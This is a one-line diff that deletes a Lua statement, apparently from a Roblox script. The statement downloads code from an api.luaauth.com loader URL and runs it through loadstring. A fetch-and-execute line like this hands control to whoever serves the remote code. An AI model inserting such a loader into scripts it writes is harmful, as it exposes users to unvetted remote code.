@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://api.luaauth.com/loader/0S031e7kPxd5pBnuE8VYaYhrKfbd4Ckv'))()
